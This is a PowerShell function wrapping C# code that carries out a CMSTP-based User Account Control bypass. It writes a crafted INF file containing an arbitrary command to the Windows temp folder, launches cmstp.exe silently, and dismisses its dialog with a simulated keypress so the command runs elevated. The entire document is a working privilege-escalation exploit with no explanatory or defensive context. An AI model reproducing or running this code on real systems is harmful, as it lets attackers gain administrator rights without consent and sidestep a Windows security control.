function Esquele {
    param(
        [Parameter()]
        [string]$Executable,
        [Parameter()]
        [string]$Command
    )
    if (![System.IO.File]::Exists($Executable)) {
        $Executable =  (Get-Command $Executable).Source
         if (![System.IO.File]::Exists($Executable)) {
                exit
         }
    }
    if ($Executable.ToLower() -eq "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe") 
    {
        if ($Command -ne "") {
            $final = "powershell -c ""$Command"""
    }
    } elseif  ($Executable.ToLower() -eq "C:\Windows\system32\cmd.exe") 
    {
        if ($Command -ne "") 
        {
            $final = "cmd /c ""$Command"""
        }
  } else 
  {
    $final =  "$Executable $Command"
  }
$sign = '$chicago$'
$code = @"
using System;
using System.Threading;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Windows;
using System.Runtime.InteropServices;
public class CMSTPBypass
{
public static string InfData = @"[version]
Signature=$sign
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
LINE
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
[Strings]
ServiceName=""ERROR""
ShortSvcName=""ERROR""
";
    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)] 
    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd); 
    [DllImport("user32.dll")]
    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
    public static string SetInfFile(string CommandToExecute) {
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append("C:\\windows\\temp");
        OutputFile.Append("\\");
        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
        OutputFile.Append(".inf");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace("LINE", CommandToExecute);
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }
    public static bool Execute(string CommandToExecute) {
        const int WM_SYSKEYDOWN = 0x0100;
        const int VK_RETURN = 0x0D;
        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute));
        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = "/au " + InfFile.ToString();
        IntPtr dptr = Marshal.AllocHGlobal(1); 
        ShellExecute(dptr, "", BinaryPath, startInfo.Arguments,  "", 0);
        Thread.Sleep(5000);
        IntPtr WindowToFind = FindWindow(null, "ERROR");
        PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);
        return true;
    }
}
"@
Add-Type $code
[CMSTPBypass]::Execute($final)
Stop-Process -Name "cmstp" -Force
}